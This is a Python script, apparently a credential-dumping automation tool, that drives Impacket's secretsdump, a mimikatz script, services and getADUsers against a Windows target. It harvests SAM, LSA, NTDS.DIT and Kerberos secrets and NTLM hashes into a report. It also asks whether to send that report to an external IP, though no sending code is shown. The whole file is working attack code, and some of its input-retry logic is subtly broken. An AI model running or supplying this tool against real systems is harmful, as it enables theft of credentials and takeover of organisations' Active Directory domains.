import argparse
import socket
import os

# Setup arg passing
parser = argparse.ArgumentParser("", formatter_class=argparse.RawTextHelpFormatter)
req_args = parser.add_argument_group('required arguments')

req_args.add_argument('-d', '--domain', help='The domain')#, required=True)
req_args.add_argument('-u', '--username', help='The username')#, required=True)
req_args.add_argument('-p', '--password', help='The password')#, required=True)

args = parser.parse_args()

# Set up variables and functions
domain = args.domain
username = args.username
password = args.password
validExfilIP = False
validTargetIP = False
secretsdump_path = './impacket/examples/secretsdump.py'
mimikatz_path = './impacket/examples/mimikatz.py'
services_path = './impacket/examples/services.py'
getADUsers_path = './impacket/examples/getADUsers.py'
dumpNTMLInfo_path = './impacket/examples/DumpNTLMInfo.py'

# Getting the AD Users requires the full DNS domain name for some reason... so we will get it here.
def get_domain_name(filepath):
    domain_name = ""
    try:
        with open(filepath, 'r') as f:
            for line in f:
                if "DNS Domain Name" in line:
                    extra, domain_name = line.split(':', 1)
                    domain_name = domain_name.strip()
                    break
    except FileNotFoundError:
        print("NTML Output file not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
    return domain_name

# Read mimikatz output and find where there are RID and User lines, if there are both then there is a chance the following
# Line will be an NTLM Hash.

def get_NTML_hash(filepath):
    try:
        with open(filepath, 'r') as f, open('./output.txt', 'a') as of:
            for line in f:
                if line.strip().startswith('RID  :') or line.strip().startswith('User :'):
                    of.write(line.strip() + "\n")
                elif '  Hash NTLM:' in line:
                    of.write(line.strip() + '\n\n')
    except Exception as e:
        print(f"An error occurred extracting the NTLM info: {e}")

def process_secrets_dump(filepath):
    start_sam = "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)"
    end_sam = "[*] Dumping cached domain logon information (domain/username:hash)"

    start_lsa = "[*] Dumping LSA Secrets"
    end_lsa = "[*] NL$KM"

    start_domain = "[*] Using the DRSUAPI method to get NTDS.DIT secrets"
    end_domain = "[*] Kerberos keys grabbed"
    end_kerberos = "[*] Cleaning up..."

    sam_flag = False
    lsa_flag = False
    domain_flag = False
    kerberos_flag = False

    sam_hashes = []
    lsa_hashes = []
    domain_hashes = []
    kerberos_info = []

    # Read the input file
    with open(filepath, 'r') as file:
        for line in file:
            # Check for start and end of SAM segment
            if line.strip() == start_sam:
                sam_flag = True # change the flag to true
                continue # skips the header
            elif line.strip() == end_sam:
                sam_flag = False

            # Check for start and end of LSA segment
            if line.strip() == start_lsa:
                lsa_flag = True
                continue
            elif line.strip() == end_lsa:
                lsa_flag = False

            # Check for start and end of domain segment
            if line.strip() == start_domain:
                domain_flag = True
                continue
            elif line.strip() == end_domain:
                domain_flag = False

            #Check for start and end of kerberos segment
            if line.strip() == end_domain:
                kerberos_flag = True
                continue
            elif line.strip() == end_kerberos:
                kerberos_flag = False

            if sam_flag:
                sam_hashes.append(line.strip())
                print("appended SAM")
            elif lsa_flag:
                lsa_hashes.append(line.strip())
                print("appended LSA")
            elif domain_flag:
                domain_hashes.append(line.strip())
                print("appended DOMAIN")
            elif kerberos_flag:
                kerberos_info.append(line.strip())
                print("appended KERBEROS")
    try:
        with open('./output.txt', 'w') as of:
            of.write("Local SAM Hashes:\n")
            for hash in sam_hashes:
                of.write(f"{hash}\n")
                print(f"{hash}")
            of.write("\nLSA Secrets:\n")
            for lsahash in lsa_hashes:
                of.write(f"{lsahash}\n")
                print(f"{lsahash}")
            of.write("\nDomains:\n")
            for domainhash in domain_hashes:
                of.write(f"{domainhash}\n")
                print(f"{domainhash}")
            of.write("\nKerberos keys:\n")
            for key in kerberos_info:
                of.write(f"{key}\n")
                print(f"{key}")
    except Exception as e:
        print(f"Error: {e}")

# Find out if the report should be exfiltrated
exfilBool = input("Would you like the generated report to be exfiltrated to an external domain? (y/n)\n")

while exfilBool.lower() != "y" and exfilBool.lower() != "n":
    exfilBool = input("Incorrect input detected, please try again (y/n)\n")

if exfilBool.lower() == "y":
    exfilBool = True
else:
    exfilBool = False

if exfilBool is True:
    while validExfilIP is False:
        # Check the Exfil IP address is in a valid format.
        exfilIP = input("Enter the IP you wish to exfiltrate the report to.\n")
        try:
            socket.inet_aton(exfilIP)
            validExfilIP = True
        except socket.error:
            exfilBool = input("The IP address entered was not valid, please try again.\n")

# Get the IP of the target machine.
while validTargetIP is False:
    targetIP = input("Enter the IP of the target system\n")
    try:
        socket.inet_aton(targetIP)
        validTargetIP = True
    except socket.error:
        targetIP = input("The target IP you entered is not valid, please try again.\n")

# Run the secretsdump script, saves to file
# FIND A WAY TO CREATE FOLDER TO SAVE TO.
secCommand = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\secOutput.txt"

os.system(secCommand)

# Use the process function and see if it works to filter out useless info. Needs input path
process_secrets_dump("c:\\temp\\secOutput.txt")

# Dump the NTLM Info
dumpNTLMCommand = f"py {dumpNTMLInfo_path} {targetIP} >> c:\\temp\\NTLMInfo.txt"
os.system(dumpNTLMCommand)

domain_name = get_domain_name("c:\\temp\\NTLMInfo.txt")

# Run the mimikatz script, this uses command.txt which elevates the token and does a lsadump.
mimiCommand = f"py {mimikatz_path} -f ./command.txt "\
              f"{domain}/{username}:{password}@{targetIP} >> c:\\temp\\mimiOutput.txt"
os.system(mimiCommand)

# Extract key info to output text file.
get_NTML_hash("c:\\temp\\mimiOutput.txt")

# Run services.py script.
servicesCommand = f"py {services_path} {domain}/{username}:{password}@{targetIP} list >> c:\\temp\\servicesOutput.txt"
os.system(servicesCommand)

# Run ADUsers script.
ADUsersCommand = (f"py {getADUsers_path} -all -dc-ip {targetIP} {domain_name}/{username}:{password}"
                  f" >> c:\\temp\\ADUsersOutput.txt")
os.system(ADUsersCommand)

